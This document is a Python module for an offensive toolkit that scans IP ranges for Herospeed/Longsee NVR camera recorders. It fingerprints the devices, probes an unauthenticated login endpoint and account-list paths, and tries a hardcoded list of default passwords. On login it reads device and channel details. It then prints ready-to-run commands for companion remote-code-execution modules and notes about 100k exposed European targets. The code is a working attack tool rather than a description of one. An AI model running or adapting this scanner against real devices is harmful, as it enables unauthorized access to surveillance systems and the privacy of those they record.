# Discovery: c3l3r1on (github.com/c3l3r1on) — Herospeed/Longsee NVR OEM platform research
# EmbedXPL-Forge module: André Henrique (@mrhenrike)
"""Herospeed/Longsee OEM NVR Scanner — fingerprint and vulnerability pre-check.

Scans for NVR devices running the Longsee/Herospeed OEM firmware platform
(API v4.0.0).  Detected via:

  - Presence of /statics/js/longseSha256.js (OEM-specific JavaScript)
  - Presence of /statics/js/hsdk-player.js or pluginCallback.js
  - /api/session/login-capabilities endpoint responding without auth and
    returning a JSON body with 'salt', 'challenge', and 'sessionID' fields
  - Api-Version: v4.0.0 header acceptance

For each discovered device the scanner reports:
  - Firmware version (from /api/system/device-info when login succeeds)
  - Channel count
  - Whether the unauthenticated account enumeration path is accessible
  - Whether default credentials authenticate

This scanner feeds the companion exploit modules:
  - exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum.py
  - exploits/cameras/herospeed/herospeed_nvr_rce.py

FOFA query (public research by c3l3r1on, May 2026): ~100k targets in Europe.

References:
  - https://github.com/c3l3r1on/nvr  (original research toolkit by c3l3r1on)
  - Discovery: c3l3r1on (github.com/c3l3r1on)

Version: 1.0.0
"""

from __future__ import annotations

import base64
import datetime
import hashlib
import json
import socket
import struct
from ipaddress import ip_address, ip_network
from typing import Any

from embedxpl.core.exploit import (
    OptIP,
    OptPort,
    OptString,
    mute,
    print_error,
    print_info,
    print_status,
    print_success,
    print_warning,
)
from embedxpl.core.exploit import Exploit as BaseExploit

_API_VERSION = "v4.0.0"
_CONNECT_TIMEOUT = 5
_READ_TIMEOUT = 8

_OEM_JS_PATHS = (
    "/statics/js/longseSha256.js",
    "/statics/js/hsdk-player.js",
    "/statics/js/pluginCallback.js",
    "/statics/js/localPlugin.js",
    "/statics/js/api.js",
)

_OEM_MARKERS = (
    b"longseSha256",
    b"hsdk-player",
    b"pluginCallback",
    b"paramConfig",
    b"Longse",
    b"LONGSE",
    b"herospeed",
    b"Herospeed",
    b"HSAPI",
)

_UNAUTH_ACCOUNT_PATHS = (
    "/api/user/accounts",
    "/api/users",
    "/api/account/accounts",
    "/api/v1/accounts",
    "/api/system/users",
)

_DEFAULT_CREDS = (
    ("admin", "admin"),
    ("admin", "12345"),
    ("admin", "123456"),
    ("admin", "admin123"),
    ("admin", "12345678"),
    ("user", "user"),
    ("admin", ""),
)


def _sha256hex(data: str) -> str:
    return hashlib.sha256(data.encode("latin1")).hexdigest()


def _hex_to_str(hex_text: str) -> str:
    hex_text = hex_text.strip().lower()
    if hex_text.startswith("0x"):
        hex_text = hex_text[2:]
    return bytes.fromhex(hex_text).decode("latin1")


def _now_b64() -> tuple[str, str]:
    raw = datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
    return base64.b64encode(raw.encode("ascii")).decode("ascii"), raw


def _build_hash(username: str, password: str, salt: str, challenge: str, iterations: int) -> tuple[str, str]:
    b64_ts, raw_ts = _now_b64()
    h1 = _sha256hex(username + salt + b64_ts + password)
    h2 = _sha256hex(_hex_to_str(h1) + challenge)
    result = h2
    for _ in range(int(iterations)):
        result = _sha256hex(_hex_to_str(result))
    return result, raw_ts


def _tcp_raw(host: str, port: int, data: bytes, timeout: int = _CONNECT_TIMEOUT) -> bytes | None:
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(data)
            response = b""
            while True:
                chunk = sock.recv(8192)
                if not chunk:
                    break
                response += chunk
            return response
    except OSError:
        return None


def _http_get(host: str, port: int, path: str, timeout: int = _CONNECT_TIMEOUT) -> tuple[int, bytes] | None:
    req = (
        f"GET {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Api-Version: {_API_VERSION}\r\nConnection: close\r\n\r\n"
    ).encode()
    raw = _tcp_raw(host, port, req, timeout)
    if not raw:
        return None
    try:
        header, _, body = raw.partition(b"\r\n\r\n")
        status = int(header.split(b"\r\n")[0].split()[1])
        return status, body
    except (ValueError, IndexError):
        return None


def _api_post(host: str, port: int, path: str, payload: dict, timeout: int = _READ_TIMEOUT) -> dict | None:
    body = json.dumps(payload).encode()
    req = (
        f"POST {path} HTTP/1.1\r\nHost: {host}:{port}\r\n"
        f"Api-Version: {_API_VERSION}\r\nContent-Type: application/json\r\n"
        f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n"
    ).encode() + body
    raw = _tcp_raw(host, port, req, timeout)
    if not raw:
        return None
    try:
        _, _, body_raw = raw.partition(b"\r\n\r\n")
        return json.loads(body_raw.decode(errors="replace"))
    except (ValueError, UnicodeDecodeError):
        return None


def _try_login(host: str, port: int, username: str, password: str) -> dict | None:
    cap = _api_post(
        host, port,
        "/api/session/login-capabilities",
        {"action": "get", "data": {"username": username}},
    )
    if cap is None or int(cap.get("code", -1)) != 0:
        return None

    cap_data = cap.get("data", {}) or {}
    param = cap_data.get("param", {}) or {}
    salt = str(param.get("salt", ""))
    challenge = str(param.get("challenge", ""))
    iterations = int(param.get("iterations", 0))
    session_id = cap_data.get("sessionID", "")
    enc_types = cap_data.get("encryptionType") or ["sha256-1"]

    if not session_id:
        return None

    hashed, raw_ts = _build_hash(username, password, salt, challenge, iterations)
    login = _api_post(
        host, port,
        "/api/session/login",
        {
            "action": "set",
            "data": {
                "username": username,
                "loginEncryptionType": enc_types[0],
                "password": hashed,
                "sessionID": session_id,
                "datetime": raw_ts,
            },
        },
    )
    if login is None or int(login.get("code", -1)) != 0:
        return None
    return login.get("data") or {}


def _probe_target(host: str, port: int) -> dict[str, Any]:
    result: dict[str, Any] = {
        "host": host,
        "port": port,
        "is_herospeed_longsee": False,
        "firmware": None,
        "oem_markers": [],
        "login_capabilities_exposed": False,
        "unauth_account_endpoint": None,
        "default_creds": None,
        "channel_count": None,
        "api_version": None,
    }

    # Step 1: check for OEM JavaScript fingerprints
    for path in _OEM_JS_PATHS:
        res = _http_get(host, port, path)
        if res is None:
            continue
        status, body = res
        if status != 200:
            continue
        found = [m.decode() for m in _OEM_MARKERS if m in body]
        if found:
            result["oem_markers"].extend(found)
            result["is_herospeed_longsee"] = True
            break

    # Step 2: probe login-capabilities (unauthenticated)
    cap = _api_post(
        host, port,
        "/api/session/login-capabilities",
        {"action": "get", "data": {"username": "admin"}},
        timeout=_CONNECT_TIMEOUT,
    )
    if cap and int(cap.get("code", -1)) == 0:
        cap_data = cap.get("data", {}) or {}
        param = cap_data.get("param", {}) or {}
        if "salt" in param or "challenge" in param or "sessionID" in cap_data:
            result["login_capabilities_exposed"] = True
            result["is_herospeed_longsee"] = True

    if not result["is_herospeed_longsee"]:
        return result

    # Step 3: check for unauthenticated account enumeration
    for path in _UNAUTH_ACCOUNT_PATHS:
        res = _http_get(host, port, path)
        if res is None:
            continue
        status, body = res
        if status not in (200, 206):
            continue
        try:
            data = json.loads(body.decode(errors="replace"))
            if int(data.get("code", -1)) == 0:
                accounts = data.get("data") or []
                if isinstance(accounts, list) and accounts:
                    result["unauth_account_endpoint"] = path
                    break
        except (ValueError, TypeError):
            pass

    # Step 4: try default credentials
    for uname, pwd in _DEFAULT_CREDS:
        login_data = _try_login(host, port, uname, pwd)
        if login_data is not None:
            result["default_creds"] = (uname, pwd)
            cookie_pair = login_data.get("cookie", "")

            # Step 5: get device info while authenticated
            body_payload = json.dumps({"action": "get"}).encode()
            info_req = (
                f"POST /api/system/device-info HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Api-Version: {_API_VERSION}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(body_payload)}\r\n"
                f"Cookie: {cookie_pair}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode() + body_payload

            raw = _tcp_raw(host, port, info_req, timeout=_READ_TIMEOUT)
            if raw:
                try:
                    _, _, body_raw = raw.partition(b"\r\n\r\n")
                    dev_info = json.loads(body_raw.decode(errors="replace"))
                    if int(dev_info.get("code", -1)) == 0:
                        dev_data = dev_info.get("data", {}) or {}
                        result["firmware"] = dev_data.get("firmwareVersion") or dev_data.get("firmware")
                        result["channel_count"] = dev_data.get("channelNumber") or dev_data.get("channels")
                except (ValueError, TypeError):
                    pass

            # Step 6: check channel online status
            ch_req_body = json.dumps({"action": "get"}).encode()
            ch_req = (
                f"POST /api/channel/online-status HTTP/1.1\r\n"
                f"Host: {host}:{port}\r\n"
                f"Api-Version: {_API_VERSION}\r\n"
                f"Content-Type: application/json\r\n"
                f"Content-Length: {len(ch_req_body)}\r\n"
                f"Cookie: {cookie_pair}\r\n"
                f"Connection: close\r\n\r\n"
            ).encode() + ch_req_body

            raw = _tcp_raw(host, port, ch_req, timeout=_READ_TIMEOUT)
            if raw and result["channel_count"] is None:
                try:
                    _, _, body_raw = raw.partition(b"\r\n\r\n")
                    ch_info = json.loads(body_raw.decode(errors="replace"))
                    if int(ch_info.get("code", -1)) == 0:
                        ch_list = ch_info.get("data") or []
                        if isinstance(ch_list, list):
                            result["channel_count"] = len(ch_list)
                except (ValueError, TypeError):
                    pass

            break

    return result


class Exploit(BaseExploit):
    """Herospeed/Longsee OEM NVR Scanner.

    Discovery: c3l3r1on (github.com/c3l3r1on)
    EmbedXPL-Forge module: Andre Henrique (@mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "Herospeed/Longsee OEM NVR Scanner",
        "description": (
            "Fingerprints and vulnerability-checks Herospeed/Longsee NVR devices "
            "(API v4.0.0, OEM platform). Detects via JS asset fingerprints and "
            "login-capabilities endpoint. Reports firmware version, channel count, "
            "unauthenticated account endpoint exposure, and default credentials. "
            "Feeds companion exploit modules. "
            "Discovery: c3l3r1on (github.com/c3l3r1on). ~100k FOFA targets EU."
        ),
        "authors": (
            "c3l3r1on (discovery — github.com/c3l3r1on)",
            "Andre Henrique (@mrhenrike) — EmbedXPL-Forge integration",
        ),
        "references": (
            "https://github.com/c3l3r1on/nvr",
        ),
        "devices": (
            "Herospeed NVR (Longsee OEM) n9000 series",
            "Force NVR-V-3008H1 and related OEM family",
            "All vendors sharing Longsee API v4.0.0 codebase",
        ),
        "cvss": {
            "score": 9.1,
            "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N",
        },
    }

    target = OptIP("", "Target IPv4 address or CIDR (e.g. 192.168.1.0/24)")
    port = OptPort(80, "Target HTTP port")

    def run(self) -> None:
        target_str = str(self.target)
        port = int(self.port)

        try:
            # Single host
            ip_address(target_str)
            hosts = [target_str]
        except ValueError:
            try:
                hosts = [str(h) for h in ip_network(target_str, strict=False).hosts()]
            except ValueError:
                print_error("Invalid target — provide an IP address or CIDR (e.g. 192.168.1.0/24)")
                return

        print_info("Discovery credit: c3l3r1on (github.com/c3l3r1on)")
        print_status(
            "Scanning {} host(s) on port {} for Herospeed/Longsee NVR...".format(len(hosts), port)
        )

        found = 0
        for host in hosts:
            result = _probe_target(host, port)
            if not result["is_herospeed_longsee"]:
                continue

            found += 1
            print_success("FOUND: {}:{}".format(host, port))

            if result["oem_markers"]:
                print_info("  OEM markers: {}".format(", ".join(set(result["oem_markers"]))))
            if result["firmware"]:
                print_info("  Firmware: {}".format(result["firmware"]))
            if result["channel_count"] is not None:
                print_info("  Channels: {}".format(result["channel_count"]))
            if result["login_capabilities_exposed"]:
                print_warning("  [VULN] /api/session/login-capabilities exposed without auth (salt/challenge disclosure)")
            if result["unauth_account_endpoint"]:
                print_warning("  [VULN] Unauthenticated account list at {}".format(result["unauth_account_endpoint"]))
            if result["default_creds"]:
                uname, pwd = result["default_creds"]
                print_warning("  [CRIT] Default credentials work: {}:{}".format(uname, pwd or "(empty)"))
                print_warning(
                    "  => Run: exploits/cameras/herospeed/herospeed_nvr_rce "
                    "target={} username={} password={}".format(host, uname, pwd or "")
                )
            elif result["login_capabilities_exposed"]:
                print_info(
                    "  => Run: exploits/cameras/herospeed/herospeed_nvr_unauth_account_enum "
                    "target={}".format(host)
                )

        if found == 0:
            print_status("No Herospeed/Longsee NVR devices found in the target range")
        else:
            print_success(
                "Scan complete — {} Herospeed/Longsee NVR device(s) detected".format(found)
            )

    @mute
    def check(self) -> bool:
        host = str(self.target)
        port = int(self.port)
        result = _probe_target(host, port)
        return result["is_herospeed_longsee"]
